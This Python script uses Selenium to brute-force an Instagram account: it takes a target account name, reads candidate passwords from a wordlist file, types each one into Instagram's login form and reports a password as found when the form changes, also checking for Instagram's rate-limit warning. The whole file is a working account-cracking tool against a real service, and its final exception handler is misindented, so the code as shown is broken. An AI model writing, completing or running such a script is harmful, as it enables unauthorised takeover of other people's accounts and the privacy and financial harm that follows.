from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException, StaleElementReferenceException, WebDriverException
from time import sleep
from pyautogui import hotkey, press

def exit_prog():
    hotkey('alt', 'f4')
    sleep(0.5)
    press('enter')
    
triedpwds = []
passcount = 0

try:
    accname = input("Enter account's name: ")
    try:
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument("--incognito")
        driver = webdriver.Chrome('C:\\nishchay\\chromedriver.exe', chrome_options=chrome_options)
        driver.set_page_load_timeout(10)
        driver.get('https://www.instagram.com/accounts/login/?hl=en')
        
    except WebDriverException:
        print("Terminated program.")
        exit_prog()
        
    with open("file.txt", "r") as ins:
        array = []
        
        for line in ins:
            array.append(line)
            
    for lines in array:
        try:
            driver.find_element_by_name("username").send_keys(Keys.CONTROL + "a")
            driver.find_element_by_name("username").send_keys(Keys.DELETE)
            driver.find_element_by_name("username").send_keys(accname)
            driver.find_element_by_name("password").send_keys(Keys.CONTROL + "a")
            driver.find_element_by_name("password").send_keys(Keys.DELETE)
            driver.find_element_by_name("password").send_keys(lines)
            print(f'Tried password: {lines}')
            passcount += 1
            triedpwds.append(lines)
            sleep(0.3)
            driver.find_element_by_name("password").send_keys(Keys.ENTER)
            
            try:
                if driver.find_element_by_id("slfErrorAlert").text == "Please wait a few minutes before you try again.":
                    print("Instagram currently isn't allowing us to enter a password for this account, try again later.")
                    exit_prog()
            
            except NoSuchElementException:
                pass
        
        except StaleElementReferenceException:
            pass
        
        except NoSuchElementException:
            print(f"Password found! {triedpwds[passcount-2]}")

            except KeyboardInterrupt:
    print("Terminated program.")
    exit_prog()
